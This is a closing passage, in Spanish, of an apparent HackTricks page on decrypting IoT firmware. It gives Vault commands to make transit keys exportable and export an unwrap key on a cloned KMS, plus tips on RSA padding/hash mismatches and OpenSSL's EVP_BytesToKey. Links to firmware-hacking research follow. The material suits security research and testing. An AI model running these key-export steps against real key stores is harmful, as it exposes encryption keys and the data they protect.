Con root en el KMS clonado:

- Haz que las claves de transit solo sean exportables dentro del clon aislado: `vault write transit/keys/<name>/config exportable=true`
- Exporta la clave unwrap: `vault read transit/export/encryption-key/<name>`
- Prueba la clave RSA recuperada con el par exacto de padding/hash que usa el KMS. Un fallo al descifrar con PKCS#1 v1.5 y otro con el descifrado OAEP predeterminado **no** demuestran que la clave sea incorrecta; muchos flujos basados en Vault usan OAEP con SHA-256, mientras que las bibliotecas comunes usan SHA-1 de forma predeterminada.
- Si el payload empieza por `Salted__`, reproduce exactamente el KDF de OpenSSL del proveedor (`EVP_BytesToKey`, a menudo MD5 en dispositivos antiguos) antes de intentar descifrar con AES-CBC.

Esto convierte el «firmware cifrado» en un problema más general: **recuperar las claves operativas del lado del dispositivo y reproducir offline los parámetros exactos de unwrap + KDF**.

## Formación y certificaciones

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Descifrado de firmware con Claude: habilidades de nivel sénior, autonomía de nivel júnior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodología de pruebas de seguridad de firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Hacking práctico de IoT: la guía definitiva para atacar el Internet de las cosas](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Explotación de vulnerabilidades zero-day en hardware abandonado – Blog de Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Cómo un dispositivo inteligente de 20 dólares me dio acceso a tu hogar](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Ahora me ves: ahora estás pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Explotación del Tesla Wall Connector desde el conector del puerto de carga - Parte 2: omisión de la protección contra downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Haz que parpadee: explotación over-the-air del Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
